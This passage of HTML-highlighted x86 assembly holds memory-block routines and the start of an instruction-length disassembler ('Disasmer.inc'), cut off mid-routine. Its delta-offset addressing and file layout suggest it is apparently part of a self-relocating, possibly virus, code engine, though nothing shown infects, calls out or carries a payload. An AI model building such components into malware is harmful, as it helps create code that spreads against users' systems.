</span><span class="sc5">RemoveBlock</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; ESi = Block to delete...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">Blocks</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoShr</span><span class="sc0">
</span><span class="sc1">;   cmp ecx,1</span><span class="sc0">
</span><span class="sc1">;   jz  NoShr</span><span class="sc0">
</span><span class="sc1">;   dec ecx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">
</span><span class="sc5">NoShr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BlockNum</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">incheck</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">JRet</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">JRet</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RemoveBlock</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
</span><span class="sc5">JoinBlocks</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; EDX + ESi = EDX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">LeaveEcx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">LeaveEcx</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">LeaveEax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">LeaveEax</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">RemoveBlock</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">JoinBlocks</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">Disasmer.inc</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">-----------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ??¿-R?R &lt;ÿ¿? ¡òð, -R  ÿöR¢ÿ?¢...</span><span class="sc0">

</span><span class="sc5">LowData</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LowType</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">GetSize32</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowType</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">SAgain</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">OpTbl</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FindIt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">BadOpcode</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">SkipBlock</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SkipBlock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindIt</span><span class="sc0">
</span><span class="sc5">BadOpcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetSize32</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetSize16</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SAgain</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetSize16</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;-----------------------</span><span class="sc0">
</span><span class="sc5">XData</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowType</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SAgain</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowType</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------</span><span class="sc0">
</span><span class="sc5">Complex</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoAdd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoAdd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoAdd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoAdd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowType</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NoAdd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">NoAdd</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11000111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotFour</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">NotFour</span><span class="sc4">:</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotAdd2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">NotAdd2</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Cplx2</span><span class="sc0">
</span><span class="sc5">NotAdd2</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Complex</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Cplx2</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotAdd4</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000111b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NotAdd4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">NotAdd4</span><span class="sc4">:</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Cplx2</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">Return7</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Return6</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Return5</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Return4</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Return3</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Return2</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Return1</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Complex1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Complex</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Complex2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Complex</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Complex4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Complex2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">GoRet</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">GoRet</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Return3or5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Return5</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Return3</span><span class="sc0">

</span><span class="sc5">Return3or5addr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LowType</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Return5</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Return3</span><span class="sc0">

</span><span class="sc5">Repzz</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SAgain</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------</span><span class="sc0">
</span><span class="sc5">Grp1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

</span><span class="sc5">Grp2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111000b</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

</span><span class="sc5">uExtended</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A4h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ABh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AFh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Complex1</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

</span><span class="sc5">S1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

</span><span class="sc5">S2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

</span><span class="sc5">S3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

</span><span class="sc5">S4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Fh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S5</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Return6</span><span class="sc0">

</span><span class="sc5">S5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9Ah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S6</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

</span><span class="sc5">S6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S7</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

</span><span class="sc5">S7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S8</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

</span><span class="sc5">S8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">S9</span><span class="sc0">
